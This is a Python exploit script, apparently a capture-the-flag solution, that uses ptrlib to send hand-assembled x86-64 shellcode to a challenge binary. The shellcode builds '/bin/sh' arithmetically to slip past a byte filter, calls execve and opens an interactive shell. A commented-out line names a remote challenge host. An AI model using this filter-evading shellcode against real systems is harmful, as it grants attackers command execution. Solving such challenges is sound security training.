#!/usr/bin/env python

import ptrlib as ptr

elf = ptr.ELF("./execute")
io = ptr.Process(elf.filepath)
# io = ptr.Socket("83.136.254.13", 45233)


def to_shellcode(array: list[int]):
    shellcode = b""
    for i in array:
        shellcode += bytes([i])
    return shellcode


code = [
    0x48,
    0xC7,
    0xC3,
    0x00,
    0x00,
    0x00,
    0x00,  # mov rbx, 0
    0x48,
    0x89,
    0xDA,  # mov rdx, rbx
    0x48,
    0x89,
    0xDE,  # mov rsi, rbx
    0x48,
    0xB8,
    0x20,
    0x60,
    0x60,
    0x60,
    0x20,
    0x70,
    0x60,
    0x00,  # mov rax, 0x60702060606020
    0x48,
    0xBB,
    0x0F,
    0x02,
    0x09,
    0x0E,
    0x0F,
    0x03,
    0x08,
    0x00,  # mov rbx, 0x08030f0e09020f
    0x48,
    0x01,
    0xD8,  # add rax, rbx
    0x48,
    0x89,
    0x45,
    0x90,  # mov [rbp-0x70], rax
    0x48,
    0xC7,
    0xC3,
    0x30,
    0x00,
    0x00,
    0x00,  # mov rbx, 0x30
    0x48,
    0x83,
    0xC3,
    0x0B,  # add rbx, 0xb
    0x48,
    0x89,
    0xD8,  # mov rax, rbx
    0x48,
    0x8D,
    0x7D,
    0x90,  # lea rdi, [rbp-0x70]
    0x0F,
    0x05,  # syscall
]


payload = to_shellcode(code)
ptr.logger.info(f"payload length: {len(payload)}")

io.sendline(payload)
io.sendline("echo pwned!")
io.recvuntil("pwned!")
io.sh()
